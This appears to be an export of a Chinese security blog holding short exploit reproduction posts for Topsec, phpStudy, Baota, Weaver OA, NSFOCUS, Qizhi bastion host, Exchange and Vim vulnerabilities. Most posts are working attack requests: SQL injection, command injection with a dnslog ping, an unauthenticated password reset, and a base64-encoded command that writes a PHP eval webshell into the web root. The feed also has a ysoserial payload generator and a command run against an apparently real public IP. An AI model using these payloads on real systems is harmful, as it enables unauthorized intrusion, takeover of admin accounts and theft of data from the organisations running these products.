<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;acc&#x2F;clsf&#x2F;report&#x2F;datasource.php HTTP&#x2F;1.1Host: localhostConnection: closeAccept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36Accept-Language: zh-CN,zh;q&#x3D;0.9Content-Type: application&#x2F;x-www-form-urlencoded t&#x3D;l&amp;e&#x3D;0&amp;s&#x3D;t&amp;l&#x3D;1&amp;vid&#x3D;1+union select 1,2,3,4,5,6,7,8,9,substr(&#39;a&#39;,1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid&#x3D;0&amp;lmt&#x3D;10&amp;o&#x3D;r_Speed&amp;asc&#x3D;false&amp;p&#x3D;8&amp;lipf&#x3D;&amp;lipt&#x3D;&amp;ripf&#x3D;&amp;ript&#x3D;&amp;dscp&#x3D;&amp;proto&#x3D;&amp;lpf&#x3D;&amp;lpt&#x3D;&amp;rpf&#x3D;&amp;rpt&#x3D;@。。</span><br></pre></td></tr></table></figure>

<p>网友称以下两个历史漏洞仍然可以复现。</p>
<p><a href="https://www.uedbox.com/post/21626/">https://www.uedbox.com/post/21626/</a></p>
<h3 id="简要描述："><a href="#简要描述：" class="headerlink" title="简要描述："></a>简要描述：</h3><p>天融信负载均衡TopApp-LB系统无需密码直接登陆</p>
<h3 id="详细说明："><a href="#详细说明：" class="headerlink" title="详细说明："></a>详细说明：</h3><p><strong>.</strong>.<strong>.</strong>/<strong>.</strong>.<strong>.</strong>/<strong>.</strong>.<strong>.</strong>/https://<strong>.</strong>.<strong>.</strong>/</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名随意  密码：;id</span><br></pre></td></tr></table></figure>



<h3 id="漏洞证明："><a href="#漏洞证明：" class="headerlink" title="漏洞证明："></a>漏洞证明：</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/d3594a983f25bd0d139b27c02cd688eb6f1ca99d.jpg" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/019af9239f1dfbc6124a5b19055d95a1ca1d39fc.jpg" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/facb5a13142ce22ea2d4dfcf9c29b3cf6a95412f.jpg" alt="img"></p>
<p><a href="https://www.uedbox.com/post/22193/">https://www.uedbox.com/post/22193/</a></p>
<p>TopApp-LB负载均衡（绝对是随机找的）<a href="https://101.231.40.234/执行命令">https://101.231.40.234/执行命令</a></p>
<p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; ping 9928e5.dnslog.info; echo</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/89b6282962ccb026c6ba981c9ce0ad0ad1215ae7.jpg" alt="img"></p>
<p>命令被成功执行，效果如图。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/b3dd327a068f4cf46d2d8987356bab0427bbb732.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>phpStudy(小皮面板)v8.1.0.7 nginx 解析漏洞</title>
    <url>/2020/09/14/WEB/Exploit/phpStudy-%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BF-v8-1-0-7-nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><strong>一、**</strong>phpStudy<strong>**(小皮面板)简介：</strong><br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-09361599060261.png" alt="phpStudy v8.1.0.7.png"></p>
<p>phpStudy国内12年老牌公益软件，集安全，高效，功能与一体，已获得全球用户认可安装，运维也高效。支持一键LAMP,LNMP,集群,监控,网站,FTP,数据库,JAVA等100多项服务器管理功能。</p>
<p><strong>二、漏洞简介：</strong></p>
<p>小皮面板 &lt;= 8.1.0.7: 啊这</p>
<p>其实这个漏洞确实不是小皮的问题,而是2017年就出现的nginx解析漏洞。</p>
<p><strong>漏洞原理**</strong>：**</p>
<p><strong>1、由于错误配置(但是测试的时候是安装完后的默认配置，我在官方论坛也反馈了，他们还狡辩。。。)导致nginx把以.php结尾的文件交给fastcgi处理,为此可以构造<a href="http://www.xxx.com/test.gif/xx.php">http://www.xxx.com/test.gif/xx.php</a> (任何服务器端不存在的php文件均可,比如a.php)</strong></p>
<p>2、但是fastcgi在处理xx.php文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了/test.gif。</p>
<p>3、 最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许fastcgi将.png等文件当做代码解析。<br>localhost_80.conf原始配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php(.*)$ &#123;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>三、漏洞复现：</p>
<p>测试环境：phpStudy(小皮面板)8.1.0.7 + 图片马（一定要注意不是那种copy的马子 有几率失败，可以下载这个<a href="https://github.com/tennc/webshell/blob/master/php/img/bypass-imagecreatefromgif-pass-00.gif">马子</a>测试）<br>复现如图：<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-1f0c1599060262.png" alt="bug_7.3.png"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-b8361599060262.png" alt="bug.png"></p>
<p>执行系统命令：<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/thum-34661599060543.png" alt="exec.png"><br>四、修复<br>php.ini 中 fix_pathinfo 禁用为0<br>cgi.fix_pathinfo=0</p>
<p>nginx.conf添加如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php(.*)$ &#123;</span><br><span class="line">      if ( $fastcgi_script_name ~ \..*\&#x2F;.*php )&#123;</span><br><span class="line">        return 403;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考链接：<a href="https://mrxn.net/news/675.html">https://mrxn.net/news/675.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>PhpStudy</tag>
        <tag>nginx解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>天融信数据防泄漏系统越权修改管理员密码</title>
    <url>/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd</p>
<p>接口未授权访问,造成直接修改任意用户密码。:默认superman账户uid为1。</p>
<p>POST /?module=auth_user&amp;action=mod_edit_pwd </p>
<p>Cookie: username=superman;</p>
<p>uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913020248653.png" alt="image-20200913020248653"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>宝塔面板phpmyadmin未授权访问漏洞</title>
    <url>/2020/09/12/WEB/Exploit/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>phpmyadmin未授权访问漏洞</p>
<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>宝塔Linux面板7.4.2版本和Windows面板6.8版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞未phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。</p>
<p>漏洞URL：<a href="http://ip:888/pma">http://ip:888/pma</a>   即可直接登录（但要求必须安装了phpmyadmin）</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200905165002377.png" alt="image-20200905165002377"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>宝塔</tag>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>泛微OA云桥任意文件读取和目录遍历漏洞</title>
    <url>/2020/09/14/WEB/Exploit/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,输入文件路径-&gt;读取文件内容。返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。</p>
<p>1、 downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150710482.png" alt="image-20200914150710482"></p>
<p>2、通过查看文件接口访问 /file/fileNoLogin/id</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150728248.png" alt="image-20200914150728248"></p>
<p>想到一个新的思路，能够在漏洞利用过程中找到更多有用的信息。</p>
<p>1、简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。</p>
<p>2、参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150903715.png" alt="image-20200914150903715"></p>
<p>3、目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载。</p>
<p>d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties</p>
<p>d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150946564.png" alt="image-20200914150946564"></p>
<p>修复建议:</p>
<p>关闭程序路由 /file/fileNoLogin</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>泛微OA</tag>
      </tags>
  </entry>
  <entry>
    <title>绿盟UTS综合威胁探针管理员任意登录</title>
    <url>/2020/09/13/WEB/Exploit/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<p>绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关网络安全威胁风险，及时检测漏洞、病毒木马、网络攻击情况，及时发现网络安全事件线索，及时通报预警重大网络安全威胁，调查、防范和打击网络攻击等恶意行为，保障重要信息系统的网络安全。<br>绿盟综合威胁探针设备版本V2.0R00F02SP02及之前存在此漏洞。<br>处置意见:<br>建议尽快更新补丁至最新： <a href="http://update.nsfocus.com/update/listBsaUtsDetail/v/F02">http://update.nsfocus.com/update/listBsaUtsDetail/v/F02</a></p>
<hr>
<p>漏洞利用过程：<br><a href="https://www.hackbug.net/usr/uploads/2020/09/1229899313.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1229899313.png" alt="1.png"></a><br><a href="https://www.hackbug.net/usr/uploads/2020/09/2582773457.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/2582773457.png" alt="2.png"></a><br>对响应包进行修改，将false更改为true的时候可以泄露管理用户的md5值密码<br><a href="https://www.hackbug.net/usr/uploads/2020/09/3504865237.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3504865237.png" alt="3.png"></a><br><a href="https://www.hackbug.net/usr/uploads/2020/09/3291977248.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3291977248.png" alt="4.png"></a><br><a href="https://www.hackbug.net/usr/uploads/2020/09/1281439051.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1281439051.png" alt="5.png"></a><br>利用渠道的md5值去登录页面<br><a href="https://www.hackbug.net/usr/uploads/2020/09/3782919846.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3782919846.png" alt="6.png"></a><br>7ac301836522b54afcbbed714534c7fb<br><a href="https://www.hackbug.net/usr/uploads/2020/09/370804192.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/370804192.png" alt="6.png"></a><br><a href="https://www.hackbug.net/usr/uploads/2020/09/78344586.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/78344586.png" alt="8.png"></a><br>成功登录，登录后通过管理员权限对设备进行管控，并且可以看到大量的攻击信息，泄露内部网络地址包括资产管理。</p>
<h2 id="本文链接："><a href="#本文链接：" class="headerlink" title="本文链接："></a>本文链接：</h2><p><a href="https://www.hackbug.net/archives/112.html">https://www.hackbug.net/archives/112.html</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>绿盟</tag>
      </tags>
  </entry>
  <entry>
    <title>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</title>
    <url>/2020/09/13/WEB/Exploit/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2019-20835%EF%BC%89/</url>
    <content><![CDATA[<p>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</p>
<p>未授权无需登录。</p>
<p>1、访问 <a href="http://10.20.10.11/listener/cluster_manage.php">http://10.20.10.11/listener/cluster_manage.php</a>  :返回 “OK”.</p>
<p>2、访问如下链接即可getshell，执行成功后，生成PHP一句话马</p>
<p>3、/var/www/shterm/resources/qrcode/lbj77.php 密码10086</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;10.20.10.10&#x2F;ha_request.php?action&#x3D;install&amp;ipaddr&#x3D;10.20.10.11&amp;node_id&#x3D;1$&#123;IFS&#125;|&#96;echo$&#123;IFS&#125;&quot; ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64$&#123;IFS&#125;- d|bash&#96;|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913015044393.png" alt="image-20200913015044393"></p>
<p>这里假设10.20.10.10为堡垒机的IP地址。</p>
<p>另外一个版本是java的。</p>
<p>POST /shterm/listener/tui_update.php</p>
<p>a=[“t’;import os;os.popen(‘whoami’)#”]</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915094059411.png" alt="image-20200915094059411"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>齐治堡垒机</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化</title>
    <url>/2020/09/12/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="﻿Java反序列化"></a>﻿Java反序列化</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Java反序列化漏洞最早是2015年年初AppSecCali会议上提出了漏洞利用思路，在2015年11月FoxGlove Security 安全团队才真实利用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的，这个漏洞直接 可以攻击WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版，在当时被称为是”2015年最被低估的漏洞”。</p>
<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有 力的数据结构类型并且实现了各种集合工具类。包括FileUpload、Betwixt、Commons Code、Commons Compress、 Commons CSV等开源工具(下面是JAVA COLLECTION 的介绍)。</p>
<p><strong>Java Collection</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVACOLLECION是java的集合类，用于存储对象，而且长度可变，可存储不同类型的对象。JAVACOLLECTION不同的容器对数据</span><br><span class="line">    的存储方式不同，即数据结构不同。JAVA集合的体系框架:</span><br><span class="line"></span><br><span class="line">collection(接口,最基本的集合)实现接口的类，集合类:</span><br><span class="line"></span><br><span class="line">set</span><br><span class="line"></span><br><span class="line">HashSet&#x2F;TreeSet...</span><br><span class="line"></span><br><span class="line">list</span><br><span class="line"></span><br><span class="line">ArrayList&#x2F;LinkedList...</span><br><span class="line"></span><br><span class="line">map</span><br><span class="line"></span><br><span class="line">vector</span><br></pre></td></tr></table></figure>

<h2 id="Java反序列化概念"><a href="#Java反序列化概念" class="headerlink" title="Java反序列化概念"></a>Java反序列化概念</h2><p>在Java程序中，序列化是程序将对象转换为字节数组，反序列化即为逆过程，将客户端的字节数据转换成对象。 序列化的目的是将对象转换为可存储或传输的字节数组，实现持久化存储。<br>实际开发代码(部分):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class RedisObjectSerializer implements RedisSerializer&lt;Object&gt; &#123; </span><br><span class="line">    private Converter&lt;Object, byte[]&gt; serializer &#x3D; new SerializingConverter();</span><br><span class="line">    private Converter&lt;byte[], Object&gt; deserializer &#x3D; new DeserializingConverter(); </span><br><span class="line">static final byte[] EMPTY_ARRAY &#x3D; new byte[0];</span><br><span class="line">public Object deserialize(byte[] bytes) &#123; </span><br><span class="line">    if (isEmpty(bytes)) &#123;</span><br><span class="line">        return null; &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        return deserializer.convert(bytes);</span><br><span class="line">    &#125; catch (Exception ex) &#123;</span><br><span class="line">        throw new SerializationException(&quot;Cannot deserialize&quot;, ex);</span><br><span class="line">    &#125;﻿</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 序列化方法</span><br><span class="line">&#x2F;&#x2F; 如果Bytes为空，返回null</span><br><span class="line">&#x2F;&#x2F; 否则使用serializer.convert(bytes)为Object</span><br><span class="line">public byte[] serialize(Object object) &#123; </span><br><span class="line">    if (object &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return EMPTY_ARRAY; &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">    return serializer.convert(object);</span><br><span class="line">    &#125; catch (Exception ex) &#123; return EMPTY_ARRAY;</span><br><span class="line">    &#125; &#125;</span><br><span class="line">&#x2F;&#x2F;判断字节数组是否为空</span><br><span class="line">&#x2F;&#x2F;@param data</span><br><span class="line">&#x2F;&#x2F;@return</span><br><span class="line">private boolean isEmpty(byte[] data) &#123; </span><br><span class="line">    return (data &#x3D;&#x3D; null || data.length &#x3D;&#x3D; 0);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java反序列化漏洞原理"><a href="#Java反序列化漏洞原理" class="headerlink" title="Java反序列化漏洞原理"></a>Java反序列化漏洞原理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">间接或直接暴露反序列化API，导致用户操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。特点:</span><br><span class="line">1.aced0005是java序列化内容的特征，如果经过base64编码，那么相对应的是rO0AB。</span><br><span class="line">2.数据包中出现&quot;sr类名&quot;</span><br><span class="line">3.某些反序列化数据的content-type为application&#x2F;x-serialization</span><br></pre></td></tr></table></figure>

<h2 id="如何检测Java反序列化"><a href="#如何检测Java反序列化" class="headerlink" title="如何检测Java反序列化"></a>如何检测Java反序列化</h2><h3 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os import base64</span><br><span class="line">payloads &#x3D; [&#39;BeanShell1&#39;, &#39;Clojure&#39;, &#39;CommonsBeanutils1&#39;, &#39;CommonsCollections1&#39;, &#39;CommonsCollections2&#39;, &#39;CommonsCollections3&#39;, &#39;CommonsCollections4&#39;, &#39;CommonsCollections5&#39;, &#39;CommonsCollections6&#39;, &#39;Groovy1&#39;, &#39;Hibernate1&#39;, &#39;Hibernate2&#39;, &#39;JBossInterceptors1&#39;, &#39;JRMPClient&#39;, &#39;JSON1&#39;, &#39;JavassistWeld1&#39;, &#39;Jdk7u21&#39;, &#39;MozillaRhino1&#39;, &#39;Myfaces1&#39;, &#39;ROME&#39;, &#39;Spring1&#39;, &#39;Spring2&#39;]</span><br><span class="line">def generate(name, cmd):</span><br><span class="line">    for payload in payloads:</span><br><span class="line">        final &#x3D; cmd.replace(&#39;REPLACE&#39;, payload)</span><br><span class="line">        print &#39;Generating &#39; + payload + &#39; for &#39; + name + &#39;...&#39;</span><br><span class="line">        command &#x3D; os.popen(&#39;java -jar ysoserial.jar &#39; + payload + &#39; &quot;&#39; + final + &#39;&quot;&#39;) result &#x3D; command.read()</span><br><span class="line">        command.close()</span><br><span class="line">        encoded &#x3D; base64.b64encode(result)</span><br><span class="line">        if encoded !&#x3D; &quot;&quot;:</span><br><span class="line">            open(name + &#39;_intruder.txt&#39;, &#39;a&#39;).write(encoded + &#39;\n&#39;)</span><br><span class="line">generate(&#39;Windows&#39;, &#39;ping -n 1 win.REPLACE.server.local&#39;) </span><br><span class="line">generate(&#39;Linux&#39;, &#39;ping -c 1 nix.REPLACE.server.local&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>将脚本生成的文件加载至Burpsuit进行Intruder，服务器端执行tcpdump icmp查看是否有命令执行成功。</strong></p>
<h2 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h2><p><a href="https://github.com/frohoff/ysoserial">ysoserial </a>是反序列化生成payload的工具。<br><a href="https://github.com/federicodotta/Java-Deserialization-Scanner">Java-Deserialization-Scanner Burpsuit</a> 插件(Burp Pro 插件商店可直接安装)，识别流量，主动被动探测。</p>
<p><a href="freddy">freddy Burpsuit </a>插件(Burp Pro 插件商店可直接安装)。 </p>
<h2 id="ysoserial工具学习"><a href="#ysoserial工具学习" class="headerlink" title="ysoserial工具学习"></a>ysoserial工具学习</h2><h3 id="java动态代理"><a href="#java动态代理" class="headerlink" title="java动态代理"></a>java动态代理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">代理委托类和代理类</span><br><span class="line"></span><br><span class="line">静态代理和动态代理静态代理，委托类和代理类同时实现一个接口，两者通过聚合实现，代理类需要有一个委托类的引用。</span><br><span class="line"></span><br><span class="line">动态代理是通过在委托类和代理类之间设置一个中介类，中介类实现InvokeHandler接口，作为调用处理器拦截对代理类方法</span><br><span class="line">    的调用.</span><br><span class="line"></span><br><span class="line">静态代理和动态代理:</span><br></pre></td></tr></table></figure>

<p>参考资料：</p>
<p>[Java Proxy和CGLIB 动态代理原理](Java Proxy 和 CGLIB 动态代理原理 Java动态代理)</p>
<p><a href="Java动态代理">Java 动态代理</a></p>
<h3 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h3><p>参考资料</p>
<p><a href="https://www.sczyh30.com/posts/Java/java-reflection-1/">深入解析Java反射（1）-基础</a></p>
<p>Jboss 反序列化漏洞利用实例</p>
<p>确定jboss应用</p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-16875: Exchange Server 远程代码执行漏洞</title>
    <url>/2020/09/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/CVE-2020-16875-Exchange-Server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><em>更新公告:<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875</a></em></p>
<p>微软公告说的很明显,只需要一个Exchange用户账号。就能在Exchange服务器上执行任意命令。</p>
<p><a href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p>
<p><a href="https://srcincite.io/pocs/cve-2020-16875.ps1.txt">https://srcincite.io/pocs/cve-2020-16875.ps1.txt</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">researcher@incite:~$ .&#x2F;poc.py</span><br><span class="line">(+) usage: .&#x2F;poc.py &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;</span><br><span class="line">(+) eg: .&#x2F;poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span><br><span class="line"></span><br><span class="line">researcher@incite:~$ .&#x2F;poc.py 192.168.75.142 harrym@exchangedemo.com:user123### mspaint</span><br><span class="line">(+) logged in as harrym@exchangedemo.com</span><br><span class="line">(+) found the __viewstate: &#x2F;wEPDwUILTg5MDAzMDFkZFAeyPS7&#x2F;eBJ4lPNRNPBjm8QiWLWnirQ1vsGlSyjVxa5</span><br><span class="line">(+) triggered rce as SYSTEM!</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Exchange-Server</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE-Vim-Neovim 任意代码执行漏洞分析(CVE-2019-12735)</title>
    <url>/2019/06/24/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/RCE-Vim-Neovim-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-12735/</url>
    <content><![CDATA[<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a><strong>0x00 背景</strong></h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/xxxxxx.jpg" alt="img"></p>
<p>vim/neovim 爆出远程代码执行漏洞，打开恶意文件即可出发，受影响的版本：</p>
<p>vim&lt;8.1.1365 Neovim&lt;0/36</p>
<p><strong><a href="https://github.com/oldthree3/CVE-2019-12735-VIM-NEOVIM">poc_address</a></strong></p>
<h3 id="0x01-漏洞成因"><a href="#0x01-漏洞成因" class="headerlink" title="0x01 漏洞成因"></a><strong>0x01 漏洞成因</strong></h3><p>漏洞产生于Vim的modeline功能中，modeline功能便于文件在共享时保持一致的编辑格式。例如，我们通常会在Python文件开头加上modeline来设置缩进</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim: ai ts&#x3D;4 sts&#x3D;4 et sw&#x3D;4 ft&#x3D;python # vim: autoindent tabstop&#x3D;4 shiftwidth&#x3D;4 expandtab softtabstop&#x3D;4 filetype&#x3D;python</span><br></pre></td></tr></table></figure>

<p>由于modeline中的命令运行于命令模式(在正常模式下按:进入)，而在命令模式下可以进行修改文件、执行脚本等敏感操作，这就产生了被恶意攻击的可能。</p>
<p>因此从安全角度考虑，在modeline中，只支持set命令，同时一些配置项会被隔离到沙箱(sandbox)中运行。</p>
<p>在沙箱中，修改文件、修改快捷键、执行shell脚本等操作都被禁止。沙箱检查由函数check_secure实现，用HAVE_SANDBOX判断是否在沙箱中，是的话生成错误信息并返回TRUE。</p>
